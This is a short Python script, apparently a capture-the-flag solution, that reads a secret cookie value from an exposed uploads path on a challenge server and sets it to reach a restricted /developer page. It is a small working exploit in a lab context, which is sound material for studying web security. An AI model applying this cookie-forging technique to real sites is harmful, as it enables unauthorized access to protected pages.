import requests

BASE = 'http://play.scriptsorcerers.xyz:10446'
s = requests.Session()

resp = s.get(f"{BASE}/developer")

secret_resp = s.get(f"{BASE}/static/uploads/secrets/secret_cookie.txt")
secret = secret_resp.text.strip()

s.cookies.set('developer_secret_cookie', secret, domain='play.scriptsorcerers.xyz')

final_resp = s.get(f"{BASE}/developer")
print(final_resp.text)